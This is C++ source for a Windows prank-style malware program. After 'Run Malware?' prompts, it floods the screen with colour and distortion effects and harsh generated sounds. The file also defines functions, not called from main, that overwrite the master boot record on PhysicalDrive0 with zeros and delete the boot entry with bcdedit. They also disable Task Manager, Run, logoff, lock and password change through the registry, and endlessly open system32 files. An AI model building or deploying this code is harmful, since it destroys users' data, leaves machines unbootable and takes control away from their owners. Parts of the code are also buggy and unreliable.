
#include <Windows.h>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <vector>
#include <thread>
#include <chrono>
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, *PRGBQUAD;
int red, green, blue;
bool ifcolorblue = false, ifblue = false;

typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

COLORREF Hue(int length) { //credits to Void_/GetMBR again
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
DWORD WINAPI system32(LPVOID lpParam) {
	HANDLE hFindFile;
	BOOL BVar1;
	int auStack612[4];
	_WIN32_FIND_DATAW local_260;

	do {
		do {
			hFindFile = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.*", &local_260); //open random system32 files, like monoxide
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 == 0);
		do {
			ShellExecuteW((HWND)0x0, L"open", local_260.cFileName, (LPCWSTR)0x0, (LPCWSTR)0x0, 5);
			Sleep(0xfa);
			BVar1 = FindNextFileW(hFindFile, &local_260);
		} while (BVar1 != 0);
	} while (true);
	Sleep(91);
}
BOOL CALLBACK MoveWindowCallback(HWND hwnd, LPARAM lParam) {
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	if (!IsWindowVisible(hwnd) || IsIconic(hwnd)) {
		return TRUE;
	}

	int newX = rand() % screenWidth;
	int newY = rand() % screenHeight;

	int newWidth = (rand() % (screenWidth / 2)) + 100;
	int newHeight = (rand() % (screenHeight / 2)) + 100;


	SetWindowPos(hwnd, HWND_TOP, newX, newY, newWidth, newHeight, SWP_NOACTIVATE | SWP_NOREDRAW);

	return TRUE;
}

DWORD WINAPI window(LPVOID lpParam) {
	srand((unsigned)time(NULL));

	while (true) {
		EnumWindows(MoveWindowCallback, 0);
		Sleep(900);
	}

	return 0;
}
DWORD WINAPI Disabler(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}
const unsigned char MasterBootRecord[512]{};  //Bytes For "MasterBootRecord"
DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
LPCWSTR  generateRandomUnicodeString(int len)
{
	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'

	for (int i = 0; i < len; i++) {
		ustr[i] = (rand() % 256) + 1024;
	}
	ustr[len] = L'\0';
	return ustr;
}
DWORD WINAPI textz(LPVOID lpParam) {

	while (true) {

		BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam);

		EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {

	SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)generateRandomUnicodeString(rand() % 10 + 10), SMTO_ABORTIFHUNG, 100, NULL);
	return true;

}
// Structure to hold HSV values
struct HSV {
	float h;  // Hue (0 - 360)
	float s;  // Saturation (0 - 1)
	float v;  // Value (0 - 1)
};

// Helper function to clamp a value within a range
template<typename T>
T clamp(T value, T min, T max) {
	return (value < min) ? min : (value > max) ? max : value;
}

// Convert RGB to HSV
HSV RGBtoHSV(COLORREF rgb) {
	float r = GetRValue(rgb) / 255.0f;
	float g = GetGValue(rgb) / 255.0f;
	float b = GetBValue(rgb) / 255.0f;

	float max = max(r, max(g, b));
	float min = min(r, min(g, b));
	float delta = max - min;

	HSV hsv;
	hsv.v = max;

	if (delta == 0) {
		hsv.h = 0;
		hsv.s = 0;
	}
	else {
		hsv.s = delta / max;

		if (max == r) {
			hsv.h = 60 * (fmod(((g - b) / delta), 6));
		}
		else if (max == g) {
			hsv.h = 60 * (((b - r) / delta) + 2);
		}
		else if (max == b) {
			hsv.h = 60 * (((r - g) / delta) + 4);
		}
		if (hsv.h < 0) {
			hsv.h += 360;
		}
	}

	return hsv;
}

// Convert HSV to RGB
COLORREF HSVtoRGB(HSV hsv) {
	float c = hsv.v * hsv.s;
	float x = c * (1 - fabs(fmod(hsv.h / 60.0f, 2) - 1));
	float m = hsv.v - c;

	float r, g, b;
	if (0 <= hsv.h && hsv.h < 60) {
		r = c; g = x; b = 0;
	}
	else if (60 <= hsv.h && hsv.h < 120) {
		r = x; g = c; b = 0;
	}
	else if (120 <= hsv.h && hsv.h < 180) {
		r = 0; g = c; b = x;
	}
	else if (180 <= hsv.h && hsv.h < 240) {
		r = 0; g = x; b = c;
	}
	else if (240 <= hsv.h && hsv.h < 300) {
		r = x; g = 0; b = c;
	}
	else {
		r = c; g = 0; b = x;
	}

	r = (r + m) * 255.0f;
	g = (g + m) * 255.0f;
	b = (b + m) * 255.0f;

	return RGB(clamp(static_cast<int>(r), 0, 255), clamp(static_cast<int>(g), 0, 255), clamp(static_cast<int>(b), 0, 255));
}
void ApplyHSVXORRainbowEffect(std::vector<COLORREF>& pixels, int width, int height, float hueShift, float xorScale) {
	for (int y = 0; y < height; y++) {
		for (int x = 0; x < width; x++) {
			// Get the pixel's index
			int index = y * width + x;

			// Convert each pixel to HSV
			HSV hsv = RGBtoHSV(pixels[index]);

			// Apply XOR operation on the pixel coordinates, and scale the result to make the effect larger
			int xorValue = x | y;
			hsv.h = fmod(hsv.h + (xorValue * xorScale) + hueShift, 360.0f);

			// Convert back to RGB
			pixels[index] = HSVtoRGB(hsv);
		}
	}
}

DWORD WINAPI xor1 (LPVOID lpParam) {
	// Get the desktop device context (DC)
	HDC hDesktopDC = GetDC(NULL);

	// Get screen dimensions
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Create a compatible DC and bitmap for processing
	HDC hMemDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);
	SelectObject(hMemDC, hBitmap);

	// Create a buffer to hold the pixel data
	std::vector<COLORREF> pixels(screenWidth * screenHeight);

	// Set up the bitmap info for working with the pixel data
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = -screenHeight;  // Negative height to ensure top-down row order
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	float hueShift = 0.0f;
	float xorScale = 0.5f;  // Adjust this value to control the size of the XOR effect

	// Infinite loop to apply the XOR-based rainbow effect
	while (true) {
		// Capture the desktop into the memory DC
		BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

		// Extract the pixel data from the bitmap
		GetDIBits(hMemDC, hBitmap, 0, screenHeight, pixels.data(), &bmi, DIB_RGB_COLORS);

		// Apply the XOR-based HSV rainbow effect with larger XOR influence
		ApplyHSVXORRainbowEffect(pixels, screenWidth, screenHeight, hueShift, xorScale);

		// Update the bitmap with the modified pixel data
		SetDIBits(hMemDC, hBitmap, 0, screenHeight, pixels.data(), &bmi, DIB_RGB_COLORS);

		// Display the modified image on the desktop
		BitBlt(hDesktopDC, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, SRCCOPY);

		// Increment the hue shift for the next frame
		hueShift += 5.0f;
		if (hueShift >= 360.0f) {
			hueShift = 0.0f;
		}

		// Add a short delay to control the effect speed
		Sleep(10);
	}

	// Clean up (will never be reached due to the infinite loop)
	DeleteObject(hBitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hDesktopDC);

	return 0;
}
void ApplyHSVRainbowEffect(std::vector<COLORREF>& pixels, int width, int height, float hueShift) {
	for (int i = 0; i < width * height; i++) {
		// Convert each pixel to HSV
		HSV hsv = RGBtoHSV(pixels[i]);

		// Shift the hue value
		hsv.h = fmod(hsv.h + hueShift, 360.0f);

		// Convert back to RGB
		pixels[i] = HSVtoRGB(hsv);
	}
}

DWORD WINAPI payload1(LPVOID lpParam) {
	// Get the desktop device context (DC)
	HDC hDesktopDC = GetDC(NULL);

	// Get screen dimensions
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Create a compatible DC and bitmap for processing
	HDC hMemDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);
	SelectObject(hMemDC, hBitmap);

	// Create a buffer to hold the pixel data
	std::vector<COLORREF> pixels(screenWidth * screenHeight);

	// Set up the bitmap info for working with the pixel data
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = -screenHeight;  // Negative height to ensure top-down row order
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	float hueShift = 0.0f;
	int slideOffset = 0;
	int slideSpeed = 2;  // Speed of the vertical sliding effect

	// Infinite loop to apply the HSV rainbow effect and vertical sliding effect
	while (true) {
		// Capture the desktop into the memory DC
		BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

		// Extract the pixel data from the bitmap
		GetDIBits(hMemDC, hBitmap, 0, screenHeight, pixels.data(), &bmi, DIB_RGB_COLORS);

		// Apply the HSV rainbow effect to the pixel data
		ApplyHSVRainbowEffect(pixels, screenWidth, screenHeight, hueShift);

		// Vertical sliding effect: Shift the pixels vertically by slideOffset
		std::vector<COLORREF> shiftedPixels(screenWidth * screenHeight);
		for (int y = 0; y < screenHeight; y++) {
			int shiftedY = (y + slideOffset) % screenHeight;
			for (int x = 0; x < screenWidth; x++) {
				shiftedPixels[shiftedY * screenWidth + x] = pixels[y * screenWidth + x];
			}
		}

		// Update the bitmap with the modified pixel data
		SetDIBits(hMemDC, hBitmap, 0, screenHeight, shiftedPixels.data(), &bmi, DIB_RGB_COLORS);

		// Display the modified image on the desktop
		BitBlt(hDesktopDC, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, SRCCOPY);

		// Increment the hue shift and slide offset for the next frame
		hueShift += 5.0f;
		if (hueShift >= 360.0f) {
			hueShift = 0.0f;
		}

		slideOffset += slideSpeed;
		if (slideOffset >= screenHeight) {
			slideOffset = 0;
		}

		// Add a short delay to control the effect speed
		std::this_thread::sleep_for(std::chrono::milliseconds(50));  // Adjust delay as needed
	}

	// Clean up (will never be reached due to the infinite loop)
	DeleteObject(hBitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hDesktopDC);

	return 0;
}
DWORD WINAPI textout1(LPVOID lpParam) {
	HDC hdc;
	int sx = 0, sy = 0;
	LPCWSTR lpText = L"Radium.exe";
	while (1)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		sx = GetSystemMetrics(0);
		sy = GetSystemMetrics(1);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, rand() % sx, rand() % sy, lpText, wcslen(lpText));
		Sleep(10);
	}
}
// Define M_PI if not defined (it might not be in some compilers)
#ifndef M_PI
#define M_PI 3.14159265358979323846
#endif

// Helper macro to convert degrees to radians
#define DEG2RAD(degrees) ((degrees) * (M_PI / 180.0))

// Function to blend colors with a simple alpha blending technique
COLORREF BlendColor(COLORREF src, COLORREF dest, float alpha) {
	int r = (int)(alpha * GetRValue(src) + (1.0f - alpha) * GetRValue(dest));
	int g = (int)(alpha * GetGValue(src) + (1.0f - alpha) * GetGValue(dest));
	int b = (int)(alpha * GetBValue(src) + (1.0f - alpha) * GetBValue(dest));
	return RGB(r, g, b);
}

void ApplyHSVXORRainbowEffect2(std::vector<COLORREF>& pixels, int width, int height, float hueShift, float xorScale) {
	for (int y = 0; y < height; y++) {
		for (int x = 0; x < width; x++) {
			// Get the pixel's index
			int index = y * width + x;

			// Convert each pixel to HSV
			HSV hsv = RGBtoHSV(pixels[index]);

			// Apply XOR operation on the pixel coordinates, and scale the result to make the effect larger
			int xorValue = x - y ^ y + x;
			hsv.h = fmod(hsv.h + (xorValue * xorScale) + hueShift, 360.0f);

			// Convert back to RGB
			pixels[index] = HSVtoRGB(hsv);
		}
	}
}

DWORD WINAPI xor2(LPVOID lpParam) {
	// Get the desktop device context (DC)
	HDC hDesktopDC = GetDC(NULL);

	// Get screen dimensions
	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	// Create a compatible DC and bitmap for processing
	HDC hMemDC = CreateCompatibleDC(hDesktopDC);
	HBITMAP hBitmap = CreateCompatibleBitmap(hDesktopDC, screenWidth, screenHeight);
	SelectObject(hMemDC, hBitmap);

	// Create a buffer to hold the pixel data
	std::vector<COLORREF> pixels(screenWidth * screenHeight);

	// Set up the bitmap info for working with the pixel data
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = screenWidth;
	bmi.bmiHeader.biHeight = -screenHeight;  // Negative height to ensure top-down row order
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	float hueShift = 0.0f;
	float xorScale = 0.5f;  // Adjust this value to control the size of the XOR effect

	// Infinite loop to apply the XOR-based rainbow effect
	while (true) {
		// Capture the desktop into the memory DC
		BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hDesktopDC, 0, 0, SRCCOPY);

		// Extract the pixel data from the bitmap
		GetDIBits(hMemDC, hBitmap, 0, screenHeight, pixels.data(), &bmi, DIB_RGB_COLORS);

		// Apply the XOR-based HSV rainbow effect with larger XOR influence
		ApplyHSVXORRainbowEffect2(pixels, screenWidth, screenHeight, hueShift, xorScale);

		// Update the bitmap with the modified pixel data
		SetDIBits(hMemDC, hBitmap, 0, screenHeight, pixels.data(), &bmi, DIB_RGB_COLORS);

		// Display the modified image on the desktop
		BitBlt(hDesktopDC, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, SRCCOPY);

		// Increment the hue shift for the next frame
		hueShift += 5.0f;
		if (hueShift >= 360.0f) {
			hueShift = 0.0f;
		}

		// Add a short delay to control the effect speed
		Sleep(1000);
	}

	// Clean up (will never be reached due to the infinite loop)
	DeleteObject(hBitmap);
	DeleteDC(hMemDC);
	ReleaseDC(NULL, hDesktopDC);

	return 0;
}
DWORD WINAPI icons(LPVOID lpParam) {
	HDC hDc = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN);
	int y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		FreeConsole();
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ERROR));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_QUESTION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_WARNING));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_ASTERISK));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_APPLICATION));
		x = rand() % GetSystemMetrics(SM_CXSCREEN);
		y = rand() % GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(hDc, x, y, LoadIcon(0, IDI_SHIELD));
		Sleep(10);
	}
}
DWORD WINAPI sine(LPVOID lpParam) {
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 1, ySize = 1;
	while (1) {
		HDC hdc = GetDC(0);
		for (int i = 0; i < sw * 1; i++) {
			int wave = sin(i / ((float)xSize) * M_PI / 99494949494) * (ySize);
			BitBlt(hdc, 0, i, sw, 1, hdc, wave, i, SRCCOPY);
		}
		if ((rand() % 1 + 1) % 1 == 0);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Trails(LPVOID lpstart) {
	HDC hdc = GetDC(0);
	POINT curpos;
	CURSORINFO cur;

	while (true) {
		GetCursorPos(&curpos);
		cur.cbSize = sizeof(cur);
		GetCursorInfo(&cur);

		DrawIcon(hdc, curpos.x, curpos.y, cur.hCursor);
	}
}
VOID WINAPI sound1() { 
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11000, 11000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[11000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((((t * 3 | t >> 4 | 1) + (43 & t >> 1 + 10) * 4 ^ 432) - (4 + t & 39 ? 52 : 8)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t / 8 >> (t >> 9)*t / ((t >> 14 & 3) + 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[16000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>((t*(t >> 8 | t << 1)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
int main() {
	if (MessageBoxW(NULL, L"Run Malware?", L"Webp.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are You Sure?", L"Webp.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			sound1();
			HANDLE thr1 = CreateThread(0, 0, xor1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thr1, 0);
			CloseHandle(thr1);
			Sleep(300);
			sound2();
			HANDLE thr2 = CreateThread(0, 0, payload1, 0, 0, 0);
			HANDLE thre2 = CreateThread(0, 0, textout1, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thr2, 0);
			CloseHandle(thr2);
			TerminateThread(thre2, 0);
			CloseHandle(thre2);
			Sleep(500);
			sound3();
			HANDLE thr3 = CreateThread(0, 0, xor2, 0, 0, 0);
			HANDLE thre3 = CreateThread(0, 0, sine, 0, 0, 0);
			HANDLE three3 = CreateThread(0, 0, icons, 0, 0, 0);
			HANDLE threee3 = CreateThread(0, 0, Trails, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thr3, 0);
			CloseHandle(thr3);
			TerminateThread(thre3, 0);
			CloseHandle(thre3);
			TerminateThread(three3, 0);
			CloseHandle(three3);
			TerminateThread(threee3, 0);
			CloseHandle(threee3);
		}
	}
}
